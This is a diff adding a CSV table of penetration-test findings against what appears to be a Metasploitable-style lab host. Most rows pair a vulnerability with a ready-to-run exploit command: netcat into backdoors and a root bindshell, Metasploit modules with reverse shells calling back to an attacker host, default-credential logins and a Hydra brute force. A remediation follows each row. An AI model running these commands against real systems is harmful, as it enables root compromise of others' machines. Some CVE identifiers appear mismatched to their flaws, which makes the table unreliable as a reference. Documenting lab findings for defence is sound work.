@@ -1,0 +1,12 @@
+
+Vulnerability,Port,CVE,CVSS,Access_Gained,Exploit_Command,Remediation
+vsftpd 2.3.4 Backdoor,21/tcp,CVE-2011-2523,10.0,root,"nc 192.168.56.101 21; USER root:); nc 192.168.56.101 6200","Upgrade vsftpd to 3.0.5+"
+Samba Usermap Script,445/tcp,CVE-2007-2447,10.0,root,"msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.101; set PAYLOAD cmd/unix/reverse_netcat; set LHOST 192.168.56.102; exploit'","Update Samba to 3.0.25+"
+UnrealIRCd Backdoor,6667/tcp,CVE-2010-2075,10.0,root,"msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.101; set PAYLOAD cmd/unix/reverse; set LHOST 192.168.56.102; exploit'","Upgrade UnrealIRCd"
+Open Root Bindshell,1524/tcp,N/A,10.0,root,"nc 192.168.56.101 1524","Stop service, block port"
+PostgreSQL RCE,5432/tcp,CVE-2007-3278,9.0,postgres→root,"msfconsole -q -x 'use exploit/linux/postgres/postgres_payload; set RHOSTS 192.168.56.101; set USERNAME postgres; set PASSWORD postgres; set LHOST 192.168.56.102; exploit'","Upgrade PostgreSQL, remove default creds"
+VNC Default Password,5900/tcp,N/A,9.8,root GUI,"vncviewer 192.168.56.101","Set VNC password"
+Tomcat Manager RCE,8180/tcp,CVE-2009-3843,9.3,tomcat55,"msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.101; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST 192.168.56.102; exploit'","Remove default creds, update Tomcat"
+MySQL Default Creds,3306/tcp,CVE-2012-2122,8.8,MySQL root,"mysql -h 192.168.56.101 -u root","Set MySQL root password"
+Distcc RCE,3632/tcp,CVE-2002-2095,9.0,root,"msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.56.101; set LHOST 192.168.56.102; exploit'","Disable distcc"
+Telnet Brute Force,23/tcp,N/A,7.5,msfadmin,"hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 telnet","Disable telnet, use SSH"
